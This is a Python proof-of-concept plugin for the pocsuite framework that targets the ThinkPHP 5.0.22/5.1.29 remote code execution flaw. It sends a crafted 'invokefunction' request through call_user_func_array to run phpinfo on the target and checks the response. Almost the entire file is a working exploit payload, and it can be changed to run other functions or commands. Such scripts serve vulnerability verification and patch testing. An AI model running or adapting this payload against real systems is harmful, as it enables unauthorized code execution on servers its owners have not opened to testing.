#!/usr/bin/python
# -*- coding: utf-8 -*-

import string
import time
from pocsuite.api.request import req #用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.utils import randomStr


class TestPOC(POCBase):
    name = 'Thinkphp5 5.0.22/5.1.29 Remote Code Execution'
    vulID = '2'  # https://www.seebug.org/vuldb/ssvid-93077
    author = ['liujun']
    vulType = 'cmd-exec'
    version = '1.0'    # default version: 1.0
    references = ['https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce']
    desc = '''Thinkphp5 5.0.22/5.1.29 Remote Code Execution'''

    vulDate = '2018-12-10'
    createDate = '2019-03-23'
    updateDate = '2019-03-23'

    appName = 'Thinkphp'
    appVersion = '5.X'
    appPowerLink = 'http://www.thinkphp.cn/'
    samples = ['']


    def _attack(self):
        """attack mode"""
        return self._verify()

    def _verify(self):
        """verify mode"""
        result = {}
        self.url = self.url + '''/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'''
        print self.url
        matchstring = 'phpinfo()'

        resp = req.get(self.url)

        if matchstring in resp.content.lower():
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
